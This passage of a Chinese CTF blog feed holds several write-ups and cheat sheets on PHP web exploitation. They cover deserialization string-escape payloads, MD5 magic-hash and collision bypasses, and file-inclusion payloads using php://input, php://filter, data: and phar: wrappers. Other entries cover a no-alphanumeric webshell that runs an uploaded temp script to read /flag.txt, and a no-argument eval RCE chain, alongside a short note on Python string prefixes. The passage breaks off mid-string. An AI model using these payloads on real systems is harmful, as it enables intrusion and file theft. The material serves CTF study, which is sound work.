class="hljs-string">&quot;;a:1:&#123;i:0;s:204:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacke<span class="hljs-string">r&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;c</span>onfig.php<span class="hljs-string">&quot;;&#125;&quot;</span>&#125;;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;化成组：phone=<span class="hljs-number">12345678901</span>email=ss<span class="hljs-keyword">@q</span>.comnickname[]=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerphoto=config.php</code></pre></li></ol><ol start="2"><li><p>关键词数减少</p><p>条件：[安洵杯 2019]easy_serialize_php 将关键字换为空格</p><ul><li><p>值逃逸（让下一组的值逃逸）</p><p>构造值，序列化过滤后吃掉下一组的键值以及值的长度，让下一组的值构成新的组并且闭合</p><pre><code class="hljs openscad">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=</span>a<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:2:&quot;</span>dd<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;&#125;</span><span class="hljs-string"></span><span class="hljs-string">序列化后的结果：</span><span class="hljs-string">&quot;</span>a:<span class="hljs-number">3</span>：&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;dd&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="hljs-string">&quot;;&#125;&quot;</span>化成组：user=<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span>&quot;;<span class="hljs-title">s</span>:59:&quot;<span class="hljs-title">a</span></span><span class="hljs-function"><span class="hljs-title">img</span> =</span>ZDBnM19mMWFnLnBocA==dd  =a                    <span class="hljs-comment">//为了让前面的a:3正确</span></code></pre></li></ul></li></ol><ul><li><p>键逃逸（也可以理解为这一组的值逃逸）</p><p>构造键，序列化过滤后吃掉对应值前面表示的长度，让值构成新的组并且闭合</p><pre><code class="hljs openscad">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=</span>a<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:2:&quot;</span>dd<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;&#125;</span><span class="hljs-string"></span><span class="hljs-string">序列化后的结果：</span><span class="hljs-string">&quot;</span>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;dd&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="hljs-string">&quot;;&#125;&quot;</span>化成组：user=<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span>&quot;;<span class="hljs-title">s</span>:59:&quot;<span class="hljs-title">a</span></span><span class="hljs-function"><span class="hljs-title">img</span> =</span>ZDBnM19mMWFnLnBocA==dd  =a                    <span class="hljs-comment">//为了让前面的a:3正确      </span></code></pre></li></ul><p>产生的原因都是序列化后对序列进行操作，导致序列产生变化，反序列化的时候也就改变了得到原本的意义，产生漏洞。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/a3320315/article/details/104118688/">https://blog.csdn.net/a3320315/article/details/104118688/</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96777110">https://blog.csdn.net/zz_Caleb/article/details/96777110</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python中 r&#39;&#39;, b&#39;&#39;, u&#39;&#39;, f&#39;&#39; 的含义</title>
    <link href="/2020/02/13/python%E4%B8%AD-r-b-u-f-%E7%9A%84%E5%90%AB%E4%B9%89/"/>
    <url>/2020/02/13/python%E4%B8%AD-r-b-u-f-%E7%9A%84%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<h2 id="r-R-非转义的原始字符"><a href="#r-R-非转义的原始字符" class="headerlink" title="r/R:非转义的原始字符"></a>r/R:非转义的原始字符</h2><pre><code class="hljs awk"><span class="hljs-string">r&#x27;input\n&#x27;</span>在此\n不为换行，为两个字符</code></pre><h2 id="b-bytes"><a href="#b-bytes" class="headerlink" title="b:bytes"></a>b:bytes</h2><pre><code class="hljs 1c">b&#x27;input\n&#x27;  <span class="hljs-meta"># bytes字节符，打印以b开头。</span></code></pre><h2 id="u-U-表示unicode字符串"><a href="#u-U-表示unicode字符串" class="headerlink" title="u/U:表示unicode字符串"></a>u/U:表示unicode字符串</h2><pre><code class="hljs awk"><span class="hljs-string">u&#x27;input\n&#x27;</span> <span class="hljs-comment"># unicode编码字符，python3默认字符串编码方式</span></code></pre><h2 id="f-format-格式化操作"><a href="#f-format-格式化操作" class="headerlink" title="f/format():格式化操作"></a>f/format():格式化操作</h2><pre><code class="hljs gauss"><span class="hljs-keyword">print</span>(f&#x27;&#123;name&#125; done in &#123;<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>() - t0:<span class="hljs-number">.2</span>f&#125; s&#x27;)  <span class="hljs-meta"># 以f开头表示在字符串内支持大括号内的python 表达式</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>日常学习1</title>
    <link href="/2020/02/13/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A01/"/>
    <url>/2020/02/13/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<blockquote><p>阅读<a href="https://xz.aliyun.com/t/3085">这个</a>记录下的东西</p></blockquote><h2 id="MD5-绕过"><a href="#MD5-绕过" class="headerlink" title="MD5()绕过"></a>MD5()绕过</h2><ol><li><p>结合php弱等于，0e开头</p><pre><code class="hljs stylus">s878926199as155964671as214587387as214587387a<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre></li><li><p>数组</p></li></ol><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><p>比较函数，有的版本php可以用数组绕过(不同类型的值)</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>相关函数</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span></code></pre><h3 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h3><p>可以结合php伪协议读源码 </p><p><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><h3 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h3><p>就是远程咯</p><p>###PHP伪协议</p><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p><code>allow_url_include = on</code><br> payload:</p><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>index.php?file=php://<span class="hljs-keyword">input</span><span class="hljs-symbol">2 </span>POST:<span class="hljs-symbol">3 </span>&lt;? phpinfo(); ?&gt;</code></pre><hr><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>可以读取本地文件<br> <code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br> 指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p><h5 id="php-phar"><a href="#php-phar" class="headerlink" title="php://phar"></a>php://phar</h5><p>PHP归档，解压缩协议<br> 上传包含任何格式文件shell的压缩包，再用phar协议解析</p><ul><li>指定相对路径</li></ul><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//shell.zip/phpinfo.txt</span></code></pre><ul><li>指定绝对路径</li></ul><pre><code class="hljs awk">index.php?file=phar:<span class="hljs-regexp">//</span>D:<span class="hljs-regexp">/index/</span>www<span class="hljs-regexp">/fileinclude/</span>shell.zip/phpinfo.txt</code></pre><h5 id="data"><a href="#data" class="headerlink" title="data:"></a>data:</h5><p>条件：</p><ol><li><code>allow_url_fopen = On</code></li><li><code>allow_url_include = On</code></li></ol><pre><code class="hljs mel">index.php?<span class="hljs-keyword">file</span>=data:<span class="hljs-keyword">text</span>/plain,%00<span class="hljs-string">`</span><span class="hljs-string"> `</span>index.php?<span class="hljs-keyword">file</span>=data:<span class="hljs-keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><h3 id="包含Session"><a href="#包含Session" class="headerlink" title="包含Session"></a>包含Session</h3><p>要求攻击者能控制部分Session的内容<br>常见的php-session存放位置：</p><ol><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ol><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol><li><p>%00绕过</p><p><code>magic_quotes_gpc = off</code><br> PHP &lt; 5.3.4</p></li><li><p>字节长度截断：最大值Windows下256字节，Linux下4096字节</p></li><li><p>%00截断目录遍历</p><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/www/%<span class="hljs-number">00</span><span class="hljs-string">`</span><span class="hljs-string"> `</span>magic_quotes_gpc = off</code></pre></li><li><p>编码绕过</p><pre><code class="hljs llvm"><span class="hljs-variable">%2</span>e<span class="hljs-variable">%2</span>e<span class="hljs-variable">%2</span>f   ../..<span class="hljs-variable">%c0</span><span class="hljs-variable">%af</span>   ../<span class="hljs-variable">%2</span>e<span class="hljs-variable">%2</span>e<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>  ..\</code></pre></li></ol><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>条件：<code>register_globals = ON</code> 4.2.0后默认关闭 5.4.0后已移除<br> 例bugku某题</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;highlight_file(<span class="hljs-keyword">__file__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);    &#125;    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>http://120.24.86.145:8004/index1.php?args=GLOBALS</code><br> 因为有eval(“var_dump($$args);”); 直接用全局变量打印所有字符串即可得到flag</p><h2 id="PHP小特性"><a href="#PHP小特性" class="headerlink" title="PHP小特性"></a>PHP小特性</h2><ol><li><p>传参时用<code>index.php?use.id</code>会被解析为use_id,除了。，+[也会被转换为_</p></li><li><p>灵活运用科学计数法 1e999</p></li><li><p>数字后加空格绕过   is_numeric()</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>做 红包题 的一些思考</title>
    <link href="/2020/02/13/%E5%81%9A-%E7%BA%A2%E5%8C%85%E9%A2%98-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <url>/2020/02/13/%E5%81%9A-%E7%BA%A2%E5%8C%85%E9%A2%98-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<blockquote><p>做了一个红包题，虽然说知识点简单，但给了我较大对学习的思考</p></blockquote><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;            <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];            highlight_file(<span class="hljs-keyword">__FILE__</span>);            <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cerror&quot;</span>);            &#125;            <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;serror&quot;</span>);            &#125;            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);                &#125;    <span class="hljs-meta">?&gt;</span></code></pre><p>题目后来知道是参照<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神的一篇文章</a>,利用无字母、数字、<code>$</code>的系统命令来getshell</p><pre><code class="hljs php+HTML">payload:index.php?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;. &#x2F;??p&#x2F;p?p??????&#96;;?&gt;POST.html:&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, minimum-scale&#x3D;1.0, maximum-scale&#x3D;1.0, initial-scale&#x3D;1.0&quot; &#x2F;&gt;    &lt;title&gt;ctf.show_红包题&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;124.156.121.112:28055&#x2F;index.php?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;. &#x2F;??p&#x2F;p?p??????&#96;;?&gt;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;    &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;rce.txt:#! &#x2F;bin&#x2F;shcat &#x2F;flag.txt</code></pre><p>​        基本思路是发送一个上传文件的POST包，此时PHP会将我们上传的文件<strong>保存在临时文件夹</strong>下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p><p>​        所以构造  <strong>.</strong>  用来执行脚本(也就是我们上传rce.txt中的内容)，**/??p/p?p??????**匹配/tmp/php??????，在响应的页面中就能看到flag。</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell</a></li><li><a href="https://www.anquanke.com/post/id/183046">session.upload</a></li><li>LFI with PHPInfo  所用知识于这个相似</li></ol><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>​        平时读博客的时候不仔细，其实在做题的时候我我看过这篇博客了，但是没有仔细看漏过了重要的东西，也就落掉了答案。重要的东西其实是吸收消化的过程，要不然和没看是一样的，加油！！！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>session upload</tag>
      
      <tag>无字母数字webshell</tag>
      
      <tag>LFI with PHPInfo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GXYCTF2019]禁止套娃</title>
    <link href="/2020/02/09/GXYCTF2020-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
    <url>/2020/02/09/GXYCTF2020-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>佛了佛了，找不到这么搞就dirsearch扫一遍吧</p><p>git泄露直接githack扒下来源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);    &#125;&#125;<span class="hljs-comment">// highlight_file(__FILE__);</span><span class="hljs-meta">?&gt;</span></code></pre><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>关注到<code>@eval($_GET[&#39;exp&#39;]);</code>,这里应该是突破口，可以RCE.</p><p>再往上看过滤了一些东西，就是函数里不能带参数。<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">无参数函数RCE</a></p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><pre><code class="hljs reasonml">payload: /?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));current(localeconv<span class="hljs-literal">()</span>) --&gt; .array_reverse  数组倒序payload：/?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));设置cookie  PHPSESSID=flag.php</code></pre><p>读取文件可以用下面这些函数</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">highlight_file</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">show_source</span><span class="hljs-params">()</span></span></code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="https://www.gem-love.com/ctf/824.html#i-2">https://www.gem-love.com/ctf/824.html#i-2</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GXYCTF2019</tag>
      
      <tag>无参数rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有关MD5</title>
    <link href="/2020/02/08/%E6%9C%89%E5%85%B3MD5/"/>
    <url>/2020/02/08/%E6%9C%89%E5%85%B3MD5/</url>
    
    <content type="html"><![CDATA[<h1 id="有关MD5的一些知识"><a href="#有关MD5的一些知识" class="headerlink" title="有关MD5的一些知识"></a>有关MD5的一些知识</h1><h2 id="GET-39-a-39-GET-39-b-39-amp-amp-MD5-GET-39-a-39-MD5-GET-39-b-39"><a href="#GET-39-a-39-GET-39-b-39-amp-amp-MD5-GET-39-a-39-MD5-GET-39-b-39" class="headerlink" title="$_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp;MD5($_GET[&#39;a&#39;]) == MD5($_GET[&#39;b&#39;])"></a><code>$_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp;MD5($_GET[&#39;a&#39;]) == MD5($_GET[&#39;b&#39;])</code></h2><p>后面==  可以用MD5后0e开头的字符串</p><pre><code class="hljs dns">QNKCDZO<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span> s878926199a<span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span> s155964671a<span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span> s214587387a<span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span> s214587387a<span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span> s878926199a<span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span></code></pre><h2 id="POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a1-39-md5-POST-39-a2-39"><a href="#POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a1-39-md5-POST-39-a2-39" class="headerlink" title="$_POST[&#39;a&#39;]!==$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a1&#39;])===md5($_POST[&#39;a2&#39;])"></a><code>$_POST[&#39;a&#39;]!==$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a1&#39;])===md5($_POST[&#39;a2&#39;])</code></h2><p>构建数组，MD5处理数组返回false，所以成立</p><pre><code class="hljs inform7">a<span class="hljs-comment">[]</span>=as&amp;b<span class="hljs-comment">[]</span>=be</code></pre><h2 id="string-POST-39-a-39-string-POST-39-b-39-amp-amp-md5-POST-39-a1-39-md5（-POST-39-a2-39"><a href="#string-POST-39-a-39-string-POST-39-b-39-amp-amp-md5-POST-39-a1-39-md5（-POST-39-a2-39" class="headerlink" title="(string)$_POST[&#39;a&#39;]!==(string)$_POST[&#39;b&#39;]&amp;&amp;md5($_POST[&#39;a1&#39;])===md5（$_POST[&#39;a2&#39;])"></a><code>(string)$_POST[&#39;a&#39;]!==(string)$_POST[&#39;b&#39;]&amp;&amp;md5($_POST[&#39;a1&#39;])===md5（$_POST[&#39;a2&#39;])</code></h2><p>MD5碰撞</p><pre><code class="hljs gcode">a=<span class="hljs-meta">%</span>D<span class="hljs-number">89</span><span class="hljs-meta">%</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span>FD<span class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>EC<span class="hljs-meta">%</span><span class="hljs-number">0</span>EL<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>FEG<span class="hljs-meta">%</span>ED<span class="hljs-meta">%</span><span class="hljs-number">5</span>B<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>D<span class="hljs-meta">%</span>CAh<span class="hljs-meta">%</span><span class="hljs-number">16</span><span class="hljs-meta">%</span>B<span class="hljs-number">4</span><span class="hljs-meta">%</span>DFl<span class="hljs-meta">%</span><span class="hljs-number">08</span>Z<span class="hljs-meta">%</span>FA<span class="hljs-meta">%</span><span class="hljs-number">1</span>DA<span class="hljs-meta">%</span><span class="hljs-number">05</span>i<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span>C<span class="hljs-number">4</span><span class="hljs-meta">%</span>FF<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">14</span><span class="hljs-meta">%</span>E<span class="hljs-number">8</span>jk<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>DK<span class="hljs-meta">%</span>DAa<span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span>DC<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span><span class="hljs-number">95</span>ab<span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>P<span class="hljs-meta">%</span>A<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<span class="hljs-meta">%</span><span class="hljs-number">1</span>ETZ<span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">92</span><span class="hljs-meta">%</span><span class="hljs-number">16</span>y<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span>CC<span class="hljs-meta">%</span><span class="hljs-number">7</span>DV<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span>FF<span class="hljs-meta">%</span>B<span class="hljs-number">8</span>e<span class="hljs-meta">%</span><span class="hljs-number">7</span>FK<span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">1</span>D<span class="hljs-meta">%</span>DF/a<span class="hljs-meta">%</span>DE<span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span>EF<span class="hljs-meta">%</span><span class="hljs-number">08</span><span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span>D<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span 